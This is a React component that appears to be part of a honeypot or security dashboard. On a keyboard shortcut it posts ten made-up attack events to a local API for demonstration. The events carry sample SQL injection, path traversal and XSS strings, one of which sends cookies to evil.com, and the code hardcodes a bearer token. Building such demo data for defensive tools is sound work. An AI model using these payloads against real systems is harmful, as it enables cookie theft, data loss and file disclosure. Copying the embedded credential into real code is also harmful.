import React, { useCallback, useEffect, useRef, useState } from 'react';
import './DemoInjector.css';

function resolveApiBase() {
  const envUrl = process.env.REACT_APP_API_URL;
  if (envUrl) return envUrl.replace(/\/$/, '');
  if (typeof window !== 'undefined' && window.location?.hostname) {
    return `http://${window.location.hostname}:5000`;
  }
  return 'http://localhost:5000';
}

const DEMO_EVENTS = [
  { type: 'event_ingested', data: { event_type: 'SQLi', source_ip: '185.220.101.47', threat_score: 88, destination: 'honeypot', uri: "/login?id=1' OR '1'='1", severity: 'high', mitre_ttps: ['T1190'] } },
  { type: 'event_ingested', data: { event_type: 'SQLi', source_ip: '185.220.101.47', threat_score: 91, destination: 'honeypot', uri: '/api/users?id=1 UNION SELECT * FROM credentials--', severity: 'critical', mitre_ttps: ['T1190'] } },
  { type: 'event_ingested', data: { event_type: 'SQLi', source_ip: '45.141.215.92', threat_score: 95, destination: 'honeypot', uri: "/search?q='; DROP TABLE users;--", severity: 'critical', mitre_ttps: ['T1190'] } },
  { type: 'event_ingested', data: { event_type: 'XSS', source_ip: '91.108.4.201', threat_score: 85, destination: 'honeypot', uri: "/comment?text=<script>fetch('https://evil.com?c='+document.cookie)</script>", severity: 'high', mitre_ttps: ['T1059'] } },
  { type: 'event_ingested', data: { event_type: 'XSS', source_ip: '91.108.4.201', threat_score: 88, destination: 'honeypot', uri: '/profile?name=<img src=x onerror=alert(1)>', severity: 'high', mitre_ttps: ['T1059'] } },
  { type: 'event_ingested', data: { event_type: 'BruteForce', source_ip: '31.220.55.14', threat_score: 78, destination: 'honeypot', uri: '/wp-admin/login', severity: 'high', mitre_ttps: ['T1110'] } },
  { type: 'event_ingested', data: { event_type: 'BruteForce', source_ip: '31.220.55.14', threat_score: 82, destination: 'honeypot', uri: '/admin/login', severity: 'high', mitre_ttps: ['T1110'] } },
  { type: 'event_ingested', data: { event_type: 'PathTraversal', source_ip: '194.165.16.12', threat_score: 90, destination: 'honeypot', uri: '/download?file=../../../../etc/passwd', severity: 'critical', mitre_ttps: ['T1083'] } },
  { type: 'event_ingested', data: { event_type: 'Probe', source_ip: '80.82.77.33', threat_score: 72, destination: 'honeypot', uri: '/nmap-scan-indicator', severity: 'medium', mitre_ttps: ['T1046'] } },
  { type: 'event_ingested', data: { event_type: 'DDoS', source_ip: '5.188.86.172', threat_score: 96, destination: 'honeypot', uri: '/', severity: 'critical', mitre_ttps: ['T1498'] } },
];

function DemoInjector() {
  const [showToast, setShowToast] = useState(false);
  const timeoutRefs = useRef([]);
  const apiBase = resolveApiBase();

  const clearTimers = useCallback(() => {
    timeoutRefs.current.forEach((id) => clearTimeout(id));
    timeoutRefs.current = [];
  }, []);

  const injectDemoEvents = useCallback(() => {
    setShowToast(true);

    const toastTimer = setTimeout(() => {
      setShowToast(false);
    }, 3000);
    timeoutRefs.current.push(toastTimer);

    const postSequentially = (index) => {
      if (index >= DEMO_EVENTS.length) return;

      const now = new Date().toISOString();
      const payload = {
        ...DEMO_EVENTS[index],
        data: {
          ...DEMO_EVENTS[index].data,
          timestamp: now,
        },
      };

      fetch(`${apiBase}/api/v1/emit-event`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: 'Bearer mayasec_internal_token',
        },
        body: JSON.stringify(payload),
      }).catch(() => {});

      const nextTimer = setTimeout(() => {
        postSequentially(index + 1);
      }, 200);
      timeoutRefs.current.push(nextTimer);
    };

    postSequentially(0);
  }, [apiBase]);

  useEffect(() => {
    const onKeyDown = (event) => {
      if (event.ctrlKey && event.shiftKey && event.key.toLowerCase() === 'd') {
        injectDemoEvents();
      }
    };

    window.addEventListener('keydown', onKeyDown);

    return () => {
      window.removeEventListener('keydown', onKeyDown);
      clearTimers();
    };
  }, [clearTimers, injectDemoEvents]);

  if (!showToast) {
    return null;
  }

  return (
    <div className="demo-injector-toast" role="status" aria-live="polite">
       Demo mode: injecting 10 attack events...
    </div>
  );
}

export default DemoInjector;
